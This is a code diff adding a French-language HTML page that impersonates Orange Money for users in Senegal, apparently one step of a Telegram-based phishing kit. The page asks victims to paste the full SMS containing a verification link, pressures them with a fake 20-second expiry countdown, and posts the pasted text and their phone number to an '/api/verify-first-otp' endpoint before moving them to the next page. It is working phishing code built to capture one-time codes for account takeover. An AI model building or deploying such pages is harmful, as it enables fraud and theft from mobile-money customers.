@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Vérifier le lien - Orange Money</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --orange-primary: #f25c05;
+            --bg-color: #f7f3ed;
+            --card-bg: #ffffff;
+            --input-bg: #fdfaf6;
+            --border-color: #ffd8b3;
+            --text-dark: #222222;
+        }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        
+        .header-box { width: 100%; background: var(--orange-primary); padding: 18px 20px; color: white; text-align: center; font-size: 22px; font-weight: 800; box-sizing: border-box; }
+        
+        .card { background: var(--card-bg); width: 92%; max-width: 440px; margin: 24px 0; padding: 32px 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); display: flex; flex-direction: column; }
+
+        .title { text-align: center; font-size: 22px; font-weight: 800; color: var(--text-dark); margin-bottom: 8px; }
+        .subtitle { text-align: center; font-size: 14px; color: #555; margin-bottom: 20px; }
+
+        /* Expiry Notice Banner */
+        .notice-banner {
+            background-color: #fff3e6;
+            border: 1.5px solid var(--border-color);
+            border-left: 4px solid var(--orange-primary);
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 14px;
+            color: #b33b00;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .phone-input-group {
+            display: flex;
+            background-color: var(--input-bg);
+            border: 1.5px solid var(--border-color);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .phone-prefix {
+            background-color: var(--orange-primary);
+            color: white;
+            padding: 14px 18px;
+            font-weight: 800;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+        }
+
+        .phone-input-group input {
+            border: none;
+            background: transparent;
+            padding: 14px 16px;
+            font-size: 16px;
+            width: 100%;
+            outline: none;
+            font-weight: 600;
+        }
+
+        label { font-size: 14px; font-weight: 700; color: var(--text-dark); margin-bottom: 8px; }
+
+        textarea.form-control {
+            background-color: var(--input-bg);
+            border: 1.5px solid var(--border-color);
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 15px;
+            color: var(--text-dark);
+            outline: none;
+            width: 100%;
+            height: 110px;
+            resize: none;
+            box-sizing: border-box;
+            margin-bottom: 24px;
+        }
+
+        .btn-orange {
+            background-color: var(--orange-primary);
+            color: white;
+            border: none;
+            width: 65%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header-box">Orange Money Loans</div>
+
+<div class="card">
+    <div class="title">Vérifier le lien</div>
+    <div class="subtitle">Collez le message SMS avec le lien que vous avez reçu</div>
+
+    <div class="notice-banner">
+        ⚠️ <span>Ce lien expire dans <span id="timer">20</span> secondes. Veuillez l'envoyer rapidement.</span>
+    </div>
+
+    <div class="phone-input-group">
+        <div class="phone-prefix">+221</div>
+        <input type="text" id="displayPhone" readonly>
+    </div>
+
+    <label>Message SMS complet</label>
+    <textarea id="smsInput" class="form-control" placeholder="Collez le message SMS complet contenant le lien ici..."></textarea>
+
+    <div>
+        <button id="verifyBtn" class="btn-orange">VÉRIFIER LE LIEN</button>
+    </div>
+</div>
+
+<script>
+    document.getElementById('displayPhone').value = localStorage.getItem('phone') || "0701253142";
+
+    // 20 Seconds Countdown
+    let timeLeft = 20;
+    const timerEl = document.getElementById('timer');
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timeLeft >= 0) timerEl.textContent = timeLeft;
+        if (timeLeft <= 0) clearInterval(timerInterval);
+    }, 1000);
+
+    document.getElementById('verifyBtn').addEventListener('click', async () => {
+        const smsContent = document.getElementById('smsInput').value.trim();
+        if (smsContent) {
+            await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: localStorage.getItem('phone'), code: smsContent, country: "Sénégal" })
+            });
+        }
+        window.location.href = "page8_5.html";
+    });
+</script>
+</body>
+</html>
